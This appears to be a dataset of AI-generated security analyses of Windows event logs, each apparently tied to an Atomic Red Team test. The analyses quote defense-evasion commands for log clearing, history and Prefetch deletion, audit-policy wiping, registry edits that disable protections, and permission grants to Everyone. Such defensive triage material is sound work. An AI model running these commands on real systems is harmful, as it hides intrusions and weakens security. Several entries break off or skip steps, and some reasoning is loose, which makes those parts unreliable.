Based on the detailed review of the logs, I determine this activity to be **MALICIOUS**. The combination of log clearing, privilege escalation, repeated logon events from an external IP, system time changes, and actions to disable the firewall indicate signs of compromise. Immediate actions should include isolating the system from the network, conducting a full forensic investigation, potential re-imaging of the host, and reviewing security policies and access logs to determine the scope and entry point of the breach. Additionally, monitoring for any similar activity across the network is highly recommended."
Delete a single file - Windows cmd,"After analyzing the provided Windows event logs, the following findings have been observed:

### 1. **Repeated Use of `cmd.exe` and `conhost.exe`**

- Multiple instances of `cmd.exe` and `conhost.exe` are spawned within a short time frame, executing commands that involve file creation and deletion in the user's temporary directory (`deleteme_T1551.004`). This pattern is indicative of a script or automated task running, potentially for maintenance or setup purposes. However, the execution and deletion of files without clear documentation can sometimes be involved in malicious activities, especially if scripts are utilizing uncommon file names or patterns.

### 2. **Wevtutil Usage for Event Log Clearing**

- The use of `wevtutil.exe` to clear event logs (""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""Security"", ""System"", and ""Windows PowerShell"") is highly suspicious. This is often a tactic employed by an attacker post-compromise to cover their tracks. The clearing of logs was performed by the user `admin_test`, indicating possible administrative level access compromise or misuse.

### 3. **Time Change Events**

- The event logs capture a sudden change in system time. Alterations to system time can be characteristic of an attempt to manipulate time stamps on event logs or other files, again pointing to potential malicious intent.

### 4. **Event Log ID 1102 - Security Log Cleared**

- The security log recorded an entry with Event ID 1102, indicating that the event log was cleared by `admin_test`. This action, especially if performed without legitimate administrative purposes, can be construed as an attempt to remove evidence of unauthorized or malicious activity.

### Conclusion:
Given the combination of repeated command executions with `cmd.exe` and `conhost.exe`, the deliberate clearing of event logs, and an adjustment of the system time, these logs present several red flags indicative of potential malicious activity. A very cautious approach needs to be taken due to the nature of the evidence observed, especially considering the critical use of tools for covering tracks.

### Resolution:
- **MALICIOUS**: The activity observed in the logs is strongly indicative of malicious behavior. There is a high likelihood of a security breach, given the log file clearing and system manipulation. Immediate steps should be taken to secure the system, including isolating the host from the network, conducting a full forensic analysis, and reviewing access logs for any unauthorized access.

### Guidance on how to proceed:
1. **Isolate Affected Systems**: Immediately disconnect the affected system (Server002) from the network to prevent potential lateral movement or further compromise.
   
2. **Conduct a Forensic Investigation**: Acquire a forensic image of the system for detailed analysis. Check for rootkits, malware, and unauthorized modifications.
   
3. **Review Administrative Access Logs**: Investigate how user `admin_test` was able to clear logs and any recent changes in the system to ensure administrative accounts are secure.
   
4. **Enhance Monitoring and Detection**: Implement stricter monitoring for similar behavior across other systems in the network. Consider using enhanced intrusion detection/prevention systems (IDPS).
   
5. **Communicate and Mitigate**: Inform stakeholders of the breach and begin processes for containment, eradication, and recovery according to your incident response plan.

Taking swift action is crucial to mitigate the potential breach and ensure organizational security."
Delete Prefetch File,"The provided Windows event logs present various activities on the system with potential indicators of suspicious behavior. Here is the detailed analysis:

1. **PowerShell Logs**:
   - A PowerShell command is being executed to remove a file from the Prefetch directory. This operation is often used to hide the presence of executed programs from forensic analysis. The Prefetch folder stores information used to enhance the performance of launching applications. Malicious actors sometimes clear this to cover their tracks.
   - The command observed is: `powershell.exe & {Remove-Item -Path (Join-Path ""$Env:SystemRoot\\prefetch\\"" (Get-ChildItem -Path ""$Env:SystemRoot\\prefetch\\*.pf"" -Name)[0])}`.

2. **Application Logs**:
   - Windows Defender was active, which is a good security practice. However, no details about scans or detections are available from these logs.

3. **Security Logs**:
   - The security event log has an event ID 1102, which indicates that the audit log was cleared. Clearing the event log can be considered highly suspicious as malicious actors often clear logs to remove evidence of their activities.
   - Several events indicating privilege escalation (e.g., Event ID 4672) could be legitimate system operations but, given the context, require scrutiny.

4. **System Logs**:
   - Log-clearing events were recorded (Event ID 104) within the System log, indicating someone cleared logs systematically, which aligns with the suspicious behavior observed.

5. **Sysmon Logs**:
   - Multiple Event ID 1 entries show different processes running. However, running processes like `conhost.exe`, `svchost.exe`, `whoami.exe`, and `powershell.exe` are not unusual themselves. The key concerns relate to the context in which PowerShell was used maliciously.
   - Event ID 5 logs track the files accessed or operations performed, again revealing normal system operations, but contextual connections with other logs must be considered.

### Assessment:

- **Suspicious PowerShell Usage**: The execution of a PowerShell script intended to delete files from the Prefetch directory denotes an attempt to remove traces of executed programs, which indicates potential malicious intent.
  
- **Event Logs Cleared**: The systematic clearing of event logs (Security and System logs) without apparent reason is consistent with activities performed by someone attempting to hide their tracks, further suggesting a compromise.

### Conclusion:

Based on the analysis of these logs:
- The activities surrounding PowerShell command execution and the clearing of event logs indicate suspicious activities that could potentially be malicious.
- It is essential to investigate these findings further, associating with any additional context available, such as network logs or alerts triggered during this timeframe.

### Recommended Resolution: **SUSPICIOUS**

Further investigation should be conducted to verify these activities' legitimacy, determine the extent of potential compromise, identify those responsible, and remediate any unauthorized access or actions. Consider conducting a threat hunt focused on unusual PowerShell usage and log manipulation activities across your systems."
Clear Powershell History by Deleting History File,"Upon reviewing the provided Windows event logs, several activities stand out as concerning and potentially malicious, indicating a compromise:

1. **Event Log Clearing**: 
   - The logs indicate the use of the `wevtutil` command-line utility for clearing various event logs (System, Security, Windows PowerShell). This activity is typically associated with attempts to cover tracks post-exploitation or during privilege escalation tasks. The logs show `C:\Windows\System32\wevtutil.exe cl` used multiple times to clear different logs.
   - Events with `EventID 104` and `EventID 1102` indicate the action of clearing logs, conducted by the user `admin_test`. 

2. **Suspicious PowerShell Activity**:
   - The execution of PowerShell scripts with the command `powershell.exe & {Remove-Item (Get-PSReadlineOption).HistorySavePath}` suggests an attempt to remove the PowerShell command history, which is a known tactic used by attackers to hide their activities.
   - The user `SERVER002\admin_test` is involved in these activities, highlighting a potentially compromised or malicious internal account.

3. **Kernel Time Change Events**:

WMIC bypass using local XSL file,"Based on the provided logs, here is a detailed analysis highlighting suspicious and potentially malicious activities:

1. **Security Log:**
   - **Event 1102**: This indicates a security log being cleared by the user ""admin_test."" This is a red flag because clearing logs can be an attempt to hide malicious activity. It is crucial to investigate why this action was performed.
   
   - **Event 4624 and 4672**: Multiple instances of these events showing logons might seem normal but should be cross-verified with user activity to ensure legitimacy. These events largely relate to system processes and privilege assignments for the SYSTEM user.

2. **Sysmon Log:**
   - **Execution of `wevtutil.exe`**: This tool was used multiple times to clear event logs (System, Application, and Security logs). This activity is suspicious and matches with the Event 1102 in the Security log. The command-line arguments confirm intentional clearing of logs.
   
   - **Execution of `powershell.exe` and usage of `wmic` and `cmd.exe`**: The user ""admin_test"" executed these processes. While the use of these utilities is common, their presence needs further investigation to ensure they were not used for malicious purposes.
   
   - **`calc.exe` execution via `wmic`**: Although seemingly benign, running calc.exe from wmic with a specific script indicates potential testing or operational misuse. 

3. **System and Application Logs:**
   - The logs also show various system activities such as Microsoft Edge updates, which appear normal given they pertain to system and application maintenance.

4. **Potential Indicators of Compromise:**
   - Clearing of logs using `wevtutil.exe`.
   - Multiple attempts to read/write using Windows Live and Microsoft accounts (Event ID 5379), although failing could indicate permissions gap possibly being probed.

Based on this analysis, the system displays signs of:

- **SUSPICIOUS** activity: The usage of `wevtutil.exe` to clear essential logs (Security, System, and PowerShell logs) especially by a user with admin privileges, strongly suggests an attempt to cover tracks. This behavior needs further investigation. Additionally, executing scripts with wmic and running processes like cmd should be checked for legitimacy.

**Guidance on How to Proceed:**
- Conduct a thorough review and audit of recent activities by user ""admin_test” and verify any changes or installations made recently.
- Restore security logs from a backup and analyze them for omitted entries.
- Verify the integrity of all files and look for unauthorized modifications.
- Implement better logging controls and alerts for `wevtutil.exe` usage and clearing logs activities.
- Review and possibly restrict access for users with admin privileges to prevent log tampering activities in the future."
Invoke CHM with default Shortcut Command Execution,"After analyzing the provided Windows event logs, here is the detailed assessment of the situation:

### Suspicious or Anomalous Behavior:
1. **Log Clearing Activity**: 
   - Multiple instances of event logs being cleared are noticed, specifically in the System, Windows PowerShell, and Security channels by the user ""admin_test"". Clearing logs, especially the Security log (Event ID 1102) and Sysmon logs using `wevtutil.exe`, is a common tactic to cover tracks in a malicious activity.

2. **PowerShell Execution**:
   - There is a PowerShell command execution logged in Windows PowerShell and Sysmon logs. The command line indicates an invocation of a script `Invoke-ATHCompiledHelp` with parameters involving manipulation of `.chm` (compiled HTML help file) files. Such scripting activity can be used for payload delivery, execution, or reconnaissance which is abnormal if not part of a routine operation.

### Malicious Indicators:
- The consistent clearing of logs using `wevtutil.exe`, especially across multiple log channels (System, PowerShell, Security), suggests an attempt to erase tracks of any illicit activities.
- The usage of PowerShell with potentially obfuscated or non-standard command-line arguments aligns with commonly used techniques by adversaries to execute scripts or commands stealthily.

### Conclusion:
Based on the log activities especially the log clearing events and suspicious PowerShell commands, it is highly indicative of malicious activity. The clearing of logs by the same user correlating with script execution using PowerShell is a significant indicator of compromise.

### Resolution: **MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Response**: Isolate the system (Server002) to prevent further potential compromise of the network.
- **Forensic Analysis**: Capture a full memory dump and preserve the current state of the system for deeper forensic analysis.

MSXSL Bypass using remote files,"Upon analyzing the provided logs, several events stand out that may indicate suspicious behavior and potentially malicious activity:

1. **Clearing of Event Logs:**
   - Instances of event log clearing are observed in both the System (`EventID 104`) and Security logs (`EventID 1102`). The logs are being cleared by the user `SERVER002\admin_test`. This is generally considered a red flag as attackers often clear logs to cover their tracks.

2. **Sparse Sysmon Logs - Wevtutil Utilization:**
   - The logs contain multiple instances of `wevtutil.exe` being executed, clearing various logs (Application, System, Security, and Windows PowerShell), which correlates with the findings above. This utility is often used to manage event logs programmatically, including clearing them.

3. **Time Discrepancy:**
   - The Security (`EventID 4616`) and System logs indicate that the system time was adjusted. Tampering with system time could be an attempt to alter timestamps in logs, complicating forensic analysis. Such actions require administrative rights, which could suggest privilege escalation if not known activity.

4. **Potential Command and Control Execution:**
   - A `cmd.exe` process executing a suspicious command line (involving `msxsl.exe` executed from a temporary directory with an external payload URL to `redcanaryco/atomic-red-team`) is seen. This could be an indicator of a penetration testing tool or exploitation attempt involving XML, hinting at potential remote shell or malware execution.

5. **Unusual Use of Common System Utilities:**
   - The combination of processes like `powershell.exe`, `wevtutil.exe`, `cmd.exe`, and `conhost.exe` being used in rapid succession is a common pattern observed in malicious activities like Living-off-the-Land attacks.

Given these points, the logs exhibit signs of potentially malicious activity. The clearing of logs by an administrative account, together with suspicious command-line executions indicating potential unauthorized activity and time manipulation, suggests that further investigation is warranted to determine the intent and scope of these activities and whether the `admin_test` account has been compromised.

### Resolution
- **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Isolate the system to prevent further unauthorized access or propagation.
   - Review access and permissions associated with the `admin_test` account and consider resetting credentials.
   - Initiate incident response procedures to preserve current log files and perform a detailed forensic analysis.

2. **Further Investigation:**
   - Analyze any additional systems and accounts potentially linked to the activity.
   - Review network logs for signs of data exfiltration or unauthorized remote connections.
   - Perform a root cause analysis to identify how access was gained and identify exploited vulnerabilities.

3. **Mitigation Measures:**
   - Apply appropriate security patches, disable unused or unnecessary services.
   - Educate users about phishing and common vectors for privilege escalation.
   - Implement enhanced logging configurations and intrusion detection systems to monitor for similar patterns in the future.

This analysis presumes no prior authorization for the observed behavior and is conducted under the assumption of standard security protocols."
Modify UseTPMPIN Registry entry,"Upon reviewing the provided Windows event logs, several points of interest suggest potential malicious activity:

### Analysis of Suspicious Behavior:
1. **Repeated Command Execution**:
   - Multiple instances of `wevtutil.exe` used to clear logs from different channels: Microsoft-Windows-Sysmon/Operational, Application, System, and Windows PowerShell. The clearing of event logs is a common tactic used by attackers to erase their tracks and is a strong indicator of suspicious behavior.
   
2. **Registry Modification**:
   - There is a `cmd.exe` process executing a command to modify the Windows Registry: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f`. This command alters data for BitLocker, which could potentially weaken security settings and suggest malicious intent.
   
3. **Security Event Log Clear**:
   - The presence of Security Event ID 1102 indicates that the security log was cleared. This is a significant red flag, as attackers often clear security logs to cover their tracks post-compromise.
   
4. **System Clock Manipulation**:
   - There are events (Event ID 4616) that indicate time changes on the system. Manipulating system time can be used to evade detection mechanisms that rely on accurate timestamps, although it could also be automated processes attempting a time sync.

5. **Process Execution and Parentage**:
   - The sequence of command executions consists of several utility tools (`whoami.exe`, `hostname.exe`), typically used for reconnaissance, chained together with processes that clear and modify logs or settings. These are executed with high integrity level privileges, further escalating the ability for misuse.

### Assessment:
Based on the investigation of these logs, the identified sequence of activities, including multiple event log clear operations, registry modifications for security policy adjustment, and timestamp manipulations, are consistent with tactics used in post-compromise activities. Such characteristics strongly indicate malicious behavior.

### Resolution:
- **MALICIOUS**: The pattern of `wevtutil.exe` usage to clear logs, the registry modification command executed via `cmd.exe`, coupled with `whoami.exe` and `hostname.exe` executions under high-integrity context suggests unauthorized activities. The clearing of security logs (Event ID 1102) is particularly indicative of attempts to cover tracks.

### Recommendations:
1. **Immediate Response**: Isolate the affected system from the network to contain any potential threat.
2. **Forensic Investigation**: Conduct a deeper forensic analysis on the system to identify the vector of compromise and scope of the intrusion.
3. **Review Security Policies**: Ensure policies are in place to prevent unauthorized clearing of event logs and enforce strict logging and monitoring.

5. **Incident Report and Notification**: Report the incident to relevant internal teams and consider notifying relevant authorities if necessary.

Conducting these actions will help in mitigating any further compromise and assist in understanding the breadth of the intrusion."
Create ADS command prompt,"### Windows Event Logs Analysis

Upon analyzing the provided Windows event logs, certain events show concerning activity patterns that could suggest potential malicious actions. Here is a detailed examination focusing on key findings that may indicate suspicious or malicious activities:

#### Key Observations:

1. **Log File Clearing Activities:**
   - Multiple event logs indicate that the user ""admin_test"" cleared logs using the `wevtutil.exe` command-line utility:
     - System Log Event 104: Indicates clearing of System and Windows PowerShell logs.
     - Security Log Event 1102: Indicates security log clearance.
     - Sysmon events show `wevtutil.exe` being used with the command `cl` (clear logs), targeting several logs including Operational, Application, System, Security, and PowerShell channels within a very short timeframe.

2. **Anomalous Command Line Execution:**
   - A `cmd.exe` process execution with the following command line: 
     ```
     ""cmd.exe"" /c echo cmd /c echo ""Shell code execution."" > %temp%\\T1564.004_has_ads_cmd.txt:adstest.txt & for /f ""usebackq delims=¿"" %i in (%temp%\\T1564.004_has_ads_cmd.txt:adstest.txt) do %i
     ```
   - This indicates the creation of alternative data streams (`adstest.txt`) which is a technique sometimes used by attackers to hide or execute additional actions undetected.

3. **Privilege Escalation and User Behavior:**
   - Event ID 4672 logs a privileged logon with elevated token for ""admin_test"", indicating user has high privileges and potentially sensitive rights like `SeDebugPrivilege` and `SeSecurityPrivilege`, which can be abused for malicious activities.
   
4. **Process Creation and Time Adjustments:**
   - Multiple time adjustments were logged (Event ID 4616) with `svchost.exe` indicating changes, although typically benign, require additional context as they can be a sign of time-based attacks or attempts at log confusion.

5. **Regular Windows Operations:**
   - The execution of legitimate system processes like `MicrosoftEdgeUpdate.exe`, `sppsvc.exe`, `TiWorker.exe`, and `TrustedInstaller.exe` indicate normal system maintenance and can be routinely found on Windows machines.

#### Assessment:

- **SUSPICIOUS Activity Detected:** Based on the observed clearing of event logs directly using command-line tools, execution of potentially obfuscated commands via alternative data streams, and multiple instances of privilege escalation, these activities deviate from typical user behavior and raise red flags.
  
#### Guidance and Next Steps:

1. **Immediate Actions:**
   - Audit recent changes to user credentials and privileges for ""admin_test"" and review any authorized usage anomalies.
   - Ensure system integrity by checking for additional unauthorized modifications or suspicious scheduled tasks.

2. **Further Investigation:**

   - Look for any potentially associated network anomalies or external communications correlating with these activities.

3. **Mitigation:**
   - Consider restricting or monitoring the usage of `wevtutil.exe` and similar toolsets to prevent unauthorized log manipulation.
   - Ensure proper logging, alerting mechanisms, and monitoring are robust and tamper-evident. Consider leveraging endpoint detection and response (EDR) solutions for more comprehensive insight.

Overall, given the evidence of log manipulation and potential stealth techniques via command execution, the described activity is not definitively malicious on its own but warrants thorough investigation for confirming any policies or security breaches."
Hidden Window-Conhost Execution,"After analyzing the provided Windows event logs, the following observations and evaluations have been made with regard to suspicious behavior, potential malicious activity, and overall system integrity:

### Suspicious or Anomalous Behavior Observed:

1. **Frequent Use of Known Windows System Tools:**
   - **HOSTNAME.EXE**, **WHOAMI.EXE**, and multiple instances of **WEVTUTIL.EXE** are invoked through **wsmprovhost.exe** with the same **LogonId** indicating potential automation or scripted activity. While these tools are legitimate Windows utilities, their frequent execution in succession can be indicative of scripting or automated exploration of system properties which malicious actors might automate.

2. **Event Log Clearance:**
   - It was noted in the **System log** and the **Security log** that there were log clearance events, specifically for channels like **System** and **Windows PowerShell**. This activity is typically considered suspicious as attackers often clear logs to cover their tracks after gaining unauthorized access.

3. **PowerShell Activity:**
   - A suspicious PowerShell command was logged in the **Windows PowerShell log**: `powershell.exe & {conhost.exe --headless calc.exe}`. The use of PowerShell to start a process in a potentially hidden or stealth mode (headless) might indicate an attempt to execute a secondary payload, in this case, `calc.exe`, possibly for functionality testing or obscured execution of malicious commands.

4. **Time Skew Events:**
   - Multiple events logged indicated a system time change within seconds which might not be typical under normal circumstances unless manually configured for some specific operational requirement. This can sometimes be used by attackers to confuse or improperly log time-related events.

### Indicators of Malicious Activity:

1. **Event Log Clearance:**
   - As mentioned, clearing event logs, especially security and PowerShell logs, directly aligns with malicious intentions to obfuscate actions from a timeline or investigation perspective.

2. **PowerShell Invocation:**
   - Systems compromised through PowerShell have been common, wherein PowerShell scripts can be used to download additional malicious payloads, execute arbitrary commands, or perform reconnaissance, especially with no arguments showing a silent establishment or task execution attempt.

### Assessment and Recommendations:
Given these observations, it should be noted that while the frequent use of native system utilities could theoretically be part of an automated admin task or legitimate script, the conjunction of these events— especially the clearing of event logs and suspicious PowerShell usage — points to a potential compromise.

Therefore, the resolution of this situation is:

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Security Actions:**
   - Disconnect the affected system, **Server002**, from the network to prevent further potential exfiltration or infection of other systems.
   - Perform a thorough forensic analysis on `Server002`. Investigate recent file changes, new file creation, unknown network connections, and any user behavior leading up to this sequence of events.

2. **Log Review & Enhanced Auditing:**
   - Review and restore log integrity and enable more granular auditing, especially on PowerShell and event log activities, and monitor for unusual spikes in system utility executions.
   - Ensure SIEM (Security Information and Event Management) systems are tuned to alert on event log clearance, PowerShell commands with suspicious parameters, and unusual sequences or frequency of command-line tool invocations.

3. **Broader Network Implications:**
   - Conduct network-wide security audits to ascertain if similar activities have transpired on other machines.
   - Use threat intelligence insights to identify known signatures associated with cleared logs and analyze enterprise-wide impact.

This assessment and guidance should help mitigate immediate risks and lay the groundwork for long-term improvements in system security posture and incident response readiness."

Disable Microsoft Office Security Features,"Based on the analysis of the event logs, the following key observations and their interpretations are made:

1. **Clearning of Event Logs**:
   - Multiple instances of the `wevtutil.exe` process are found in the logs, specifically using the command line `cl` to clear logs for various channels, including `Security`, `Application`, `System`, and `Windows PowerShell` channels (`EventID 104, 1102` in System and Security logs). This behavior is particularly concerning as it indicates an attempt to remove traces of activities that might otherwise be recorded, which is a common tactic used by malicious actors to cover their tracks.

2. **Suspicious PowerShell Activity**:
   - The `PowerShell` process (`EventID 600` in PowerShell logs) executed a script that modified registry settings related to Microsoft Office Excel's security configurations, such as setting `VBAWarnings`, `DisableInternetFilesInPV`, `DisableUnsafeLocationsInPV`, and `DisableAttachmentsInPV`. This type of activity is suspicious as it alters security settings, potentially lowering the defenses of Excel against macro-based attacks.

3. **User Context and Privilege Level**:
   - The activities logged are associated with a high integrity level and performed under the account `SERVER002\\admin_test`, indicating that the user had administrative privileges on the system. The `LogonId` used is consistent across events, giving further indication that these actions were conducted within the same user session.

4. **Microsoft Edge Update Entries**:
   - Multiple entries related to `MicrosoftEdgeUpdate.exe` (Sysmon logs) appear to be legitimate operations related to updating the Microsoft Edge browser and its components. These entries are common on systems where updates are managed.

5. **Use of Standard Windows Tools**:
   - Multiple entries show processes such as `services.exe`, `svchost.exe`, and `whoami.exe`, which on their own do not indicate malicious activity. However, their presence alongside log-clearing activities and unauthorized registry modifications warrants a closer look into their contexts.

### Assessment
The combination of event log clearing activities, suspicious PowerShell script execution to alter security settings, and consistent administrative activity indicates potential malicious activity. The behavior aligns with indicators of compromise, such as attempting to cover tracks by clearing logs and modifying security settings via PowerShell scripts.

Revoke unnecessary high-level privileges from accounts pending investigation.

Overall, the activity warrants further investigation and monitoring to ensure no unauthorized malicious actions are in progress."
Clear Windows Audit Policy Config,"Upon reviewing the provided Windows event logs, there are several indicators of suspicious and potentially malicious activities, which merit further investigation.

1. **Log Clearing Events (Event ID 104 in System log, Event ID 1102 in Security log)**
    - Multiple log file clearing events were recorded at the same timestamp (`2024-10-28 11:13:57`), specifically targeting the System, Security, and Windows PowerShell channels. The user account responsible, `admin_test`, executed these actions, indicating potential attempts to erase evidence of unauthorized activities.

2. **Privilege Escalation (Event ID 4672 in Security log)**
    - There are events indicating that the user `admin_test` was assigned special privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` during login. These privileges are typically not granted during standard operating conditions and can enable an attacker to manipulate system operations to escalate privileges.

3. **Suspicious Command Execution (Sysmon log)**
    - The `wevtutil.exe` utility was executed multiple times by the `admin_test` user to clear event logs, as shown in Sysmon logs. The command line used, such as `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`, directly corresponds with the log clearing events and indicates an attempt to cover tracks.

4. **Audit Policy Modification (Event ID 4719 in Security log)**
    - There are multiple recorded instances of audit policy changes made by the `admin_test` user. Commands like `""cmd.exe"" /c auditpol /clear /y & auditpol /remove /allusers` were executed, likely to disable and clear security auditing to prevent detection of further malicious actions.

5. **Time Modification Events (Event ID 4616 in Security log)**
    - Event ID 4616 indicates changes to the system time, which can be leveraged by attackers to manipulate timestamps for concealing malicious activities or for avoiding event-triggered detection mechanisms.

Given these findings, the overall assessment of the logs is as follows:

Create and start VirtualBox virtual machine,"### Detailed Analysis

Upon reviewing the provided logs from the Security, System, and Sysmon logs, a few key points of interest indicate potentially suspicious behavior:

1. **Clearing of Event Logs:**
   - The logs show EventID 1102 in the Security log, indicating that the event log was cleared. This action is typically associated with attempts to cover up tracks after a potential malicious activity as legitimate system administration tasks would rarely require this unless purging logs for storage management under strict logging policies.
   - The System and Windows PowerShell logs were also cleared, as seen in multiple EventID 104 entries, further raising suspicion about unauthorized log management.

2. **Process Execution Patterns:**
   - Multiple instances of the `wevtutil.exe`, a command-line utility for managing event logs, are observed. It was used to clear logs in the logs provided, including Sysmon logs. `wevtutil.exe` activity, especially with `cl` (clear) command in a rapid sequence across significant logs like Security, System, and PowerShell, suggests an attempt to delete evidence of activities.
   - The `powershell.exe` process was executed by the user `admin_test`, which coupled with log clearing, suggests a potential for executing scripts or commands that might be of a malicious nature.

3. **Unusual Command Execution:**
   - An execution of `cmd.exe` was found running a sequence of commands related to the creation and start of a Virtual Machine using Oracle VirtualBox. This could be suspicious if not part of normal operations as it could be used to spin up environments for executing malware.
   - Instances of utilities like `hostname.exe` and `whoami.exe` are present, which might be used for reconnaissance within the system by an attacker post-compromise.

4. **System Integrity and Execution Context:**
   - Most actions were performed under a `High` integrity level by the user `SERVER002\\admin_test`, which can suggest privilege escalation if this context was not originally provided or intended.

5. **Registry and Software Update Activities:**
   - Routine activities related to Microsoft Edge updates (`setup.exe` and related processes), executing under `NT AUTHORITY\SYSTEM`, are likely benign, related to regular software updates.

### Assessment

- **Indicators of Compromise:**
    - **Security Red Flags:** Log clearing across Security, System, and PowerShell logs; series of commands executed by elevated privileges.
    - **Anomalous Use of Command-Line Tools:** Use of wevtutil for log clearing and handling by a suspected compromised user, admin_test.
    - **Potentially Malicious Sequences:** The combination of log clearance followed by execution of potentially suspicious processes.

### Resolution

- **Resolution**: **MALICIOUS**
  - The confluence of event log clearing and execution of critical system utilities like PowerShell and `wevtutil` by initially unauthorized user actions usually suggest malicious activity aimed at hiding actions or maintaining persistence.

### Recommendations

- **Immediate Actions:**
  - Conduct a thorough review of administrative accounts, particularly 'admin_test', and rescind suspicious access.
  - Analyze any associations to recent activity and review network access logs for lateral movement.
- **Forensic Actions:**
  - Collect RAM and fellow endpoint artifacts that may provide additional context or capture remnants of executed commands and scripts.
- **Preventive Measures:**
  - Enhance logging and monitoring policies to flag and alert on log manipulation and utility executions, like `wevtutil` or unexpected PowerShell scripts, particularly outside of planned maintenance periods.
- **Ensure System Integrity:**
  - Conduct antimalware scans across the network and check integrity of critical system files for modifications."
Activate Windows NoControlPanel Group Policy Feature,"After analyzing the provided Windows event logs, several activities suggest potential indicators of compromise. Here's a detailed breakdown of the suspicious behavior:

1. **Log File Clearing Events**: We see multiple instances of log files being cleared:
   - System log (EventID 104)
   - Security log (EventID 1102)

   The clearing of logs is generally unusual and suggests that someone might be trying to hide their tracks on a system. This is a common tactic used by attackers after performing potentially malicious activities.

2. **Usage of `wevtutil.exe`**: The events show multiple instances where the `wevtutil.exe` process was executed with the `cl` (clear) parameter to clear different channels, such as System, Security, and Windows PowerShell:
   - This is highly suspicious, as `wevtutil.exe` is a legitimate Windows utility, but using it to clear logs often indicates malicious intent.

3. **Process Execution with High Integrity Levels**:
   - Execution of commands like `cmd.exe` to modify registry settings using `reg.exe`. Specifically, the command attempts to disable the Control Panel for the current user. This falls under suspicious activity as altering registry settings without proper change management can indicate malware manipulation.

4. **Multiple Instances of System Utility Executions**:
   - Multiple executions of utilities like `whoami.exe`, `hostname.exe`, and `conhost.exe` in a short timespan are associated with the `SERVER002\admin_test` user. While these utilities are legitimate, their unusual frequency and context in this scenario raise concerns about script-based attacks or batch command executions typically associated with reconnaissance tools or post-exploitation frameworks.

5. **Suspicious Command-Line Arguments**:
   - The logged sysmon events indicate command lines involving registry edits that enforce policy changes (`reg add ...NoControlPanel`). Direct registry modifications with potentially harmful settings are a red flag.

6. **Overall Pattern**:
   - There is a clear sequence where logs are cleared following the usage of system utilities and registry modifications. This suggests an operational pattern commonly associated with malware or an attacker attempting unauthorized changes and cleanup operations.

Based on the analysis, these activities together strongly suggest malicious behavior. Specifically, log file clearing, registry modification attempts, and processes executed with high integrity levels all point towards attempts to obfuscate unauthorized changes made to the system. 

**Resolution**: MALICIOUS

**Next Steps and Guidance**:
- Conduct a detailed forensic analysis of the system to recover any logs or activities that may still be traceable.
- Investigate other systems within the same network scope for similar activity as potential lateral movement or propagation.
- Change all administrative credentials immediately on the affected system and any interconnected systems to ensure security.
- Isolate the affected host from the network and analyze memory and disk images for further malicious artifacts.
- Review and tighten security policies to prevent unauthorized usage of system utilities like `wevtutil.exe`."
BlackByte Ransomware Registry Changes - CMD,"Based on the analysis of the provided Windows event logs, here are the key observations and assessments:

### Suspicious Activities:

1. **Event Log Clearing:**
   - The logs show multiple entries related to the clearing of event logs:
     - Sysmon Event ID 5 (EventRecordIDs 17956, 17960, 17968) indicates the use of `wevtutil.exe` to clear logs with command lines such as `""C:\Windows\system32\wevtutil.exe"" cl Application`, `""C:\Windows\system32\wevtutil.exe"" cl System`, and `""C:\Windows\system32\wevtutil.exe"" cl Security`.
     - System Event ID 104 shows logs being cleared for the ""System"" and ""Windows PowerShell"" channels by the user `SERVER002\admin_test`.
     - Security Event ID 1102 in the Security log indicates that the Security event log was cleared.
   - Clearing event logs without proper documentation or justification is highly suspicious as it can be an attempt to cover malicious activities.

2. **Registry Modifications:**
   - There are series of command-line executions to change registry settings:
     - Commands include adding or modifying registry keys related to `LocalAccountTokenFilterPolicy`, `EnableLinkedConnections`, and `LongPathsEnabled`.
     - These actions were executed under the context of `cmd.exe` and `reg.exe` with high integrity level, indicating administrative privileges, and these changes can be used for backdooring or maintaining persistence.

### Benign Activities:

1. **Edge Update Processes:**
   - Multiple processes pertaining to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`) are observed. These appear as regular updates likely initiated through scheduled tasks under the user context `NT AUTHORITY\SYSTEM`.

### Assessment and Resolution:

Given the combination of unusual log clearance events and registry modifications observed in the logs, the behavior is considered **highly suspicious**. There are clear indicators that suggest an attempt to obfuscate malicious actions on the system through log clearing, and registry modifications initiated by potentially malicious scripts or commands.

**Resolution:** **SUSPICIOUS**

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Confirm with the user `SERVER002\admin_test` or the relevant IT staff if any recent administrative tasks were intended to clear logs or modify registry settings.
   - If no legitimate explanation arises, consider conducting a detailed forensic investigation of the host system.

2. **Review Security Policies:**
   - Evaluate event log retention policies and ensure systems are set to trigger alerts on event log clearance activities.
   - Implement controls to restrict registry modifications and log clearance unless properly documented.

3. **Conduct Further Investigation:**
   - Collect and analyze any remaining available logs from other systems or network appliances such as firewalls or intrusion detection systems.
   - Use endpoint detection solutions to scan the system for further indicators of compromise or unauthorized access."
cacls - Grant permission to specified user or group recursively,"Upon analyzing the provided log entries, several key observations and potential concerns are noted:

1. **Event Log Clearing:**
   - There are multiple instances of the event logs being cleared across different channels (Security, System, Application).
   - Logs being cleared is captured by Event ID 1102 in the Security log and Event ID 104 in the System log. These actions were performed by the user `admin_test`.
   - The clearing of logs can be indicative of potentially malicious activity, as it may be an attempt to conceal actions taken on the system.

2. **Process and Command Line Activity:**
   - Several `cmd.exe` instances were executed with unusual or potentially suspicious command-line arguments, such as creating and modifying directories and files (`T1222.001_cacls`) and modifying file permissions using `icacls.exe`.
   - Use of `wevtutil.exe` to clear event logs through command lines, particularly `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, and `cl Security`, which correspond to the clearing of logs:
     - This sequence of events indicates an attempt to erase tracks within the system, a common strategy to hide unauthorized actions.
   - The use of `icacls.exe` with parameters `/grant Everyone:F` is concerning as it points to changing file permissions to grant full control to all users, which may facilitate unauthorized access or privilege escalation.

3. **Account in Use:**
   - The account `admin_test` is consistently seen across various operations, which include potentially suspicious actions. Given that this is an admin account, it would inherently have high privileges, making its activities critical to monitor.

4. **Integrity Level:**
